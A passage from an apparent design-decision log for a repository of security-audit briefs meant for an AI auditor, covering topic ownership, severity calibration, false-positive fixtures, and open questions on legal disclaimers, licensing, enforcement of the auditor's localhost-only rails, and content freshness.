- **crypto-deep-dive** â€” small edit, high stakes: three nonce examples currently teach the inverse of the truth and one severity row names the wrong compromised key.
- **threat-modeling** â€” net-new section: the only lens with no severity calibration, and the only one whose findings are inherently unfalsifiable.
- **llm-and-ai** â€” lightest: delete the provider section, add MCP/agentic coverage, de-duplicate embedding inversion.

### Decided

- **Ownership collisions are resolved in `_topics.md`, not by parallel edits.** `signature-verification` and `mac-comparison` (JWT `alg` confusion, webhook signature checks, constant-time compare) go to **crypto-deep-dive**; `dependency-confusion`, `lockfile-integrity`, `action-pinning`, `postinstall-scripts`, `slopsquatting` go to **cicd-and-supply-chain** (web-and-api's A03 block and mobile's M2 are deleted down to `defers:` entries); mobile M6 â†’ **privacy-and-compliance**, mobile M10 â†’ **crypto-deep-dive**; PHI severity scoring â†’ **hipaa-and-phi**.
- **The privacy/HIPAA identifier conflict is split into two slugs, not arbitrated.** `pii-in-urls` is owned by privacy-and-compliance, `phi-in-urls` by hipaa-and-phi, each with its own severity. This preserves the one-owner invariant without either lens having to defer a real check.
- **Mobile's cert-pinning contradiction resolves downward: Low.** Absent pinning is Low hygiene; it elevates to Medium only where the app is the sole client of a private API *and* handles PHI or payment data. The checklist line changes, not the table.
- **Frontmatter is narrowed to match content rather than content invented to match frontmatter** â€” with one exception. Mobile drops Flutter from `activates_on`. Salesforce keeps Visualforce (cheap: `escape="false"`, `{!$CurrentPage.parameters}`, `apex:page action` CSRF) and *must* add Experience Cloud guest-user access, because that is a correctness gap in the domain's top real-world exposure, not a scope preference.
- **`web-and-api` inlines injection/XSS.** "Covered in main SKILL.md" is incompatible with the self-contained-brief contract; a lens an auditor receives verbatim cannot outsource its highest-volume category.
- **Every `Known false positives` bullet is backed by a `fixtures/clean/` case.** CI asserts zero findings at Low or above across `clean/`; this is what makes the FP sections load-bearing instead of decorative, and it is the only mechanical check that catches over-firing lenses.
- **`threat-modeling` gets a mandatory anchor rule**, phrased as a hard gate in its severity section: every threat cites a specific file, config value, or explicitly stated architectural assumption; un-anchored threats are not findings and move to an "Assumptions to confirm" list; any threat resolving to a single endpoint is handed to web-and-api. `severity_floor: low` for all activation lenses.
- **Cross-cutting lenses may not claim registry slugs.** attack-chaining and completeness only elevate or annotate existing findings. business-logic *may* originate findings, but tags them under its own lens name with no `_topics.md` slug; CI checks that no `cross_cutting: true` lens cites a registry slug as owner.
- **Date-bound content is neutralized, not refreshed.** `frameworks:` stays unversioned (already agreed); named-vendor BAA verdicts are deleted outright rather than moved to a side file; llm-and-ai's provider section becomes an undated provider-agnostic *questionnaire* (questions rot far slower than answers); incidents (XZ Utils, tj-actions/changed-files, the 2025 npm worms) are cited with dates as illustrative examples, never as a current-threat inventory.
- **Vulnerable fixtures ship non-functional**: no working payloads, no real or realistic credentials, `fixtures/` excluded from code scanning, and a README warning. This keeps the repo from reading as a malware sample or drowning in Dependabot/CodeQL noise.

### Needs a human decision

1. **Does the repo carry a legal-advice disclaimer, and do hipaa-and-phi and privacy-and-compliance keep rendering compliance verdicts?** Not decidable from the data: both lenses tell an auditor to assert whether code satisfies a named regulation, and the author's exposure depends on facts no reference file contains â€” who publishes, under whose name, and whether the material is presented to clients. *Default if no answer:* keep both lenses and their verdict language, and add a prominent, unmissable "not legal advice, no attorney-client relationship, verify against current OCR/EDPB/PCI SSC guidance" banner in README and at the top of both lens bodies.
2. **Is this material the author's to MIT-license, and is total genericization sufficient?** The HIPAA lens's vendor sections and mobile's Firebase/RevenueCat feature list are visible residue of private, likely employer-adjacent work. Whether that residue is an IP problem or merely an aesthetic one depends on employment terms and where the content was written â€” nothing in the recon data speaks to it. *Default:* total genericization (no employer, tenant, product, or person names anywhere, including commit history and the copyright line, which goes in the author's personal name), and if the author cannot confirm ownership of the HIPAA content, ship without hipaa-and-phi rather than delay the other twelve lenses.
3. **Do the hard rails get machine enforcement, or stay prose?** "Local repo and localhost only, never commit, never source production credentials" is currently instruction text â€” reliable for a well-behaved model, worthless against a downstream user who points T2 at staging. Enforcement (a PreToolUse hook denying non-loopback hosts and `git commit`/`git push`) is a real build-and-maintain cost, and whether that cost is worth paying is the author's call on who the audience is. *Default:* ship prose rails plus a documented, opt-in example hook in the README; do not make it mandatory or a CI requirement.
4. **Does the repo make any freshness promise, and who owns the date-bound content?** Five lenses cite material with a known decay curve (PCI DSS 6.4.3/11.6.1, the 2025 amended COPPA Rule, DPF adequacy, OWASP list years, cloud platform defaults). A stated review cadence is a commitment only the maintainer can make. *Default:* one `AS_OF: 2026-07` line in README, an explicit "these lenses are point-in-time and will drift; PRs welcome" note, no promised cadence, and no CI staleness check.
